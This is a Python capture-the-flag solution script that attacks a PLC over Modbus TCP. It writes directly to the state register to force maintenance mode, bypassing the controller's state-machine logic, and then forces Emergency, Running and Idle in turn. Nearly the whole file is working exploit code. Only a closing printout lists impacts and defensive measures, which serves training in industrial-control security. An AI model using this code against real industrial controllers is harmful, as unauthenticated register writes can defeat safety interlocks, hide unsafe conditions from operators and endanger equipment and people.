#!/usr/bin/env python3
"""
CTF Challenge 6: State Machine Attack (Hard - 400 points)
Force the PLC state machine into maintenance mode (state 5)

Method: Write directly to state register %MW6
"""

import socket
import struct
import time

PLC_HOST = 'localhost'
PLC_PORT = 502

def build_write_register(transaction_id, address, value):
    """Build a Modbus Write Single Register request"""
    protocol_id = 0
    data_length = 6
    unit_id = 1
    function_code = 6

    return struct.pack('>HHHBBHH',
        transaction_id,
        protocol_id,
        data_length,
        unit_id,
        function_code,
        address,
        value
    )

def build_read_register(transaction_id, address, quantity):
    """Build a Modbus Read Holding Registers request"""
    protocol_id = 0
    data_length = 6
    unit_id = 1
    function_code = 3

    return struct.pack('>HHHBBHH',
        transaction_id,
        protocol_id,
        data_length,
        unit_id,
        function_code,
        address,
        quantity
    )

def build_read_coils(transaction_id, address, quantity):
    """Build a Modbus Read Coils request"""
    protocol_id = 0
    data_length = 6
    unit_id = 1
    function_code = 1

    return struct.pack('>HHHBBHH',
        transaction_id,
        protocol_id,
        data_length,
        unit_id,
        function_code,
        address,
        quantity
    )

def parse_read_registers_response(response):
    """Parse a Read Holding Registers response"""
    if len(response) < 9:
        return None

    byte_count = response[8]
    num_registers = byte_count // 2

    registers = []
    for i in range(num_registers):
        offset = 9 + (i * 2)
        reg_value = struct.unpack('>H', response[offset:offset+2])[0]
        registers.append(reg_value)

    return registers

def parse_read_coils_response(response):
    """Parse a Read Coils response"""
    if len(response) < 9:
        return None

    byte_count = response[8]
    coil_bytes = response[9:9+byte_count]

    coils = []
    for byte_val in coil_bytes:
        for bit in range(8):
            coils.append(bool(byte_val & (1 << bit)))

    return coils

def main():
    print("="*60)
    print("CTF Challenge 6: State Machine Attack")
    print("="*60)
    print()
    print("Objective: Force PLC into maintenance mode")
    print("Method: Write directly to state register")
    print()

    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    try:
        sock.connect((PLC_HOST, PLC_PORT))
        print(f"✓ Connected to PLC at {PLC_HOST}:{PLC_PORT}")
    except Exception as e:
        print(f"❌ Failed to connect: {e}")
        return

    transaction_id = 1

    state_names = {
        0: 'Idle',
        1: 'Starting',
        2: 'Running',
        3: 'Stopping',
        4: 'Emergency',
        5: 'Maintenance'
    }

    print("\n[Phase 1] Reading current state machine...")
    request = build_read_register(transaction_id, 6, 1)
    sock.send(request)
    response = sock.recv(1024)

    registers = parse_read_registers_response(response)
    if registers:
        current_state = registers[0]
        print(f"  Current State: {current_state} ({state_names.get(current_state, 'Unknown')})")

    transaction_id += 1

    print("\n[Phase 2] Forcing maintenance mode...")
    print("  Writing state = 5 to register 6 (state)")

    # Write 5 to register 6 (state variable)
    request = build_write_register(transaction_id, 6, 5)
    sock.send(request)
    response = sock.recv(1024)
    print("  ✓ Write command sent")

    transaction_id += 1
    time.sleep(0.5)

    print("\n[Phase 3] Verifying state change...")
    request = build_read_register(transaction_id, 6, 1)
    sock.send(request)
    response = sock.recv(1024)

    registers = parse_read_registers_response(response)
    if registers:
        new_state = registers[0]
        print(f"  New State: {new_state} ({state_names.get(new_state, 'Unknown')})")

        if new_state == 5:
            print("\n🎯 SUCCESS! PLC forced into maintenance mode")
            print("   Normal state machine logic bypassed")
            print("   Challenge completed!")
        else:
            print(f"\n⚠️  State is {new_state} (expected 5)")

    transaction_id += 1

    print("\n[Phase 4] Reading system status in maintenance mode...")
    request = build_read_coils(transaction_id, 12, 4)
    sock.send(request)
    response = sock.recv(1024)

    coils = parse_read_coils_response(response)
    if coils:
        motor = coils[0]
        brake = coils[1]
        alert = coils[2]
        maintenance = coils[3]

        print(f"  Motor Running: {motor}")
        print(f"  Brake Engaged: {brake}")
        print(f"  Alert Active: {alert}")
        print(f"  Maintenance Mode: {maintenance}")

    transaction_id += 1

    print("\n[Phase 5] Demonstrating state manipulation...")
    test_states = [4, 2, 0]  # Emergency, Running, Idle

    for target_state in test_states:
        print(f"\n  Forcing state to {target_state} ({state_names.get(target_state, 'Unknown')})...")
        request = build_write_register(transaction_id, 6, target_state)
        sock.send(request)
        sock.recv(1024)
        transaction_id += 1
        time.sleep(0.5)

        request = build_read_register(transaction_id, 6, 1)
        sock.send(request)
        response = sock.recv(1024)
        registers = parse_read_registers_response(response)

        if registers:
            print(f"    Verified: State = {registers[0]} ({state_names.get(registers[0], 'Unknown')})")
        transaction_id += 1

    print("\n[Phase 6] Restoring normal operation...")
    request = build_write_register(transaction_id, 6, 0)
    sock.send(request)
    sock.recv(1024)
    print("  ✓ State restored to Idle")

    print("\n[Impact Analysis]")
    print("  • Unauthorized state changes bypass safety logic")
    print("  • Normal interlocks may not function in forced states")
    print("  • Operations team loses visibility into actual conditions")
    print("  • Can mask equipment failures or unsafe conditions")

    print("\n[Defensive Measures]")
    print("  1. Implement state change authentication")
    print("  2. Log all state transitions with source tracking")
    print("  3. Add state consistency checks and validation")
    print("  4. Use separate safety PLC for critical functions")
    print("  5. Monitor for rapid or unexpected state changes")

    sock.close()

if __name__ == '__main__':
    main()
